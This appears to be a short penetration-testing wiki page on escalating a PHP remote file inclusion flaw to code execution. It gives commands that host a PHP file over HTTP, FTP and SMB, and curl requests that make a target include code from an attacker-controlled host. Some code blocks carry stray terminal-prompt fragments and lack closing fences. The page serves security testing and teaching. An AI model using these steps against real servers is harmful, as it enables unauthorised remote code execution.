# RFI to RCE

## via HTTP

The tester can host an arbitrary PHP code and access it through the HTTP protocol

```bash
# Create phpinfo.php
echo '<?php phpinfo(); ?>' > phpinfo.php

# Start a web server
python3 -m http.server 80

# Exploit the RFI to fetch the remote phpinfo.php file
curl '$URL/?parameter=http://tester.server/phpinfo.php'
```

## via FTP

The tester can also host his arbitrary PHP code and access it through the FTP protocol. He can use the python library pyftpdlib to start a FTP server.

```bash
# Start FTP server
sudo python3 -m pyftpdlib -p 21                                                                                                                                            1 ↵ alex@ubuntu

> [!TIP]
> PHP uses the anonymous credentials to authenticate to the FTP server. If the tester needs to use custom credentials, he can authenticate as follows :
> 
> `curl '$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php'`

## via SMB

Sometimes, the vulnerable web application is hosted on a Windows Server, meaning the attacker could log into a SMB Server to store the arbitrary PHP code.

[Impacket](https://github.com/SecureAuthCorp/impacket)'s [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) (Python) script can be used on the attacker-controlled machine to create a SMB Server.

```
sudo python3 smbserver.py -smb2support share $(pwd) 130 ↵ alex@ubuntu

The PHP script can then be included by using a [UNC](https://en.wikipedia.org/wiki/Universal_Naming_Convention) Path.

```bash
curl '$URL/?parameter=\\tester.server\phpinfo.php'
```
